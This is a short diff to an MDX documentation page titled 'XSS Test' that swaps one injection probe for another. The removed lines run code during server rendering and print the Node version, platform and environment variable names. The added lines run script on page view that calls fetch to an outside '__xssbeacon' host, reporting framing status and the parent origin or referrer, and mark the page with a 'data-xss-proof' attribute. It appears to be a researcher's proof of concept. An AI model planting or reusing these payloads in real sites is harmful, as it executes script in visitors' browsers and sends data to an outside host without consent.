@@ -1,8 +1,9 @@
 ---
 title: "XSS Test"
-description: "ssr exec probe"
+description: "editor-preview context probe"
 ---
 
 XSSPROBESTART
-NodeVer:{globalThis.process?.version ?? 'NOPROC'}|Plat:{globalThis.process?.platform ?? 'NOPLAT'}|EnvKeys:{globalThis.process?.env ? Object.keys(globalThis.process.env).slice(0,10).join('~') : 'NOENV'}
+{globalThis.fetch?.('https://reacher-44c3453d.mintlify.app/__xssbeacon?framed='+(globalThis.top!==globalThis.self)+'&anc='+encodeURIComponent((globalThis.location&&globalThis.location.ancestorOrigins&&globalThis.location.ancestorOrigins[0])||globalThis.document?.referrer||'none'))}
+{globalThis.document?.documentElement?.setAttribute?.('data-xss-proof','FIRED-'+globalThis.location?.host)}
 XSSPROBEEND
